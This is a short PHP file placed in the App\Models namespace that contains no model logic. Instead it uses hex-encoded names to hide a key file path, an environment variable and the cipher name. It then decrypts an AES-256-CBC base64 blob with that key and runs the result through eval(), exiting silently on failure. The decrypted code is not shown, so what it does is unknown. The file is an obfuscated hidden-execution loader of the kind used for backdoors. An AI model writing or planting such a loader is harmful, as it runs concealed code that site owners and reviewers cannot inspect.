<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jwxF+qxt6mb5iL4qu+Q5Hg==');

$c=base64_decode(

'viwhWaz7bb/ajj4WPOPEI84P+SL/cOwgFkkNqTq9+e5HgKq6i8MoZKAQIhW/WbwATBynKe4tAT42' .
'O6BF/VQUsKArhS1PkjGe6ZA34fJ5C804GeBb5HwZQ5mBGejszUVflxCv9DJdI8lHMs7jfD0UffRf' .
'16kryImreemBSwsuJSTlz7MRftC/TLYDfLKdchgDZR5S6V8XvDkH7nHqhLr6ZCoKlOEO70YHIAUc' .
'akLB6N7EDSrF5/vZIqtiGLeqMQGpLLA9EyIg6Pz7G1aL7WOCE8WG48+AAQsv8IoxnqxYnD1sosap' .
'Mxshw5AJQ3+2RAd62Q2XRyqMttGh4mP9S/ZqeQTvIAJTMSd+nxkED3BRWL/OCQdmap9yxwh+fBAo' .
'dwoC6ZXtDfn+x786wZm0iLOgGbA8pkTp8k0Vb4rKpqrTAkRcdQSikUMHZAyElDjTQI8l7OtZd5s3' .
'6lUUgm72wXu9dfuDmVkqkYDGXszuc/+Dx2fPcSMTXSMIioeBp9SnxDUkcAYPQQwxyPKzrIOps0aT' .
'fVe3J1m4RqXgHeCNF8aLTSCPjL8ajW/XJdnqw9gSO9KfaOjjGFmT35gSqifbuXAEtV7N5IT27uLb' .
'B4f2y5BUW7Jy4JDGeokhwEzeuXyITwxtLl+bP9wDSOfjW4+8UR8qn3Kk47NUwzggceIzozTUULv6' .
'9lnsCWIOnK+dCcjyCDvHwka34PHtRqS+okQZb7e/LxiwsstafGf1tOVsClUrXQZneESdk8S+6c60' .
'+Gso1soigSIQ7AYQEThnKw7zFKqLxI/cXa6aeXuTG2tYMre36+GfzxYATxAFuzDRD91hWQ+kndry' .
'fYysNADeN24pB5hhHmKrVZ0KJeatXQ5aNA4ZqPb5WxJR6LxKBDXaMvqV3SmfiUYwKVK/qJcUP1PV' .
'7WzRKg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

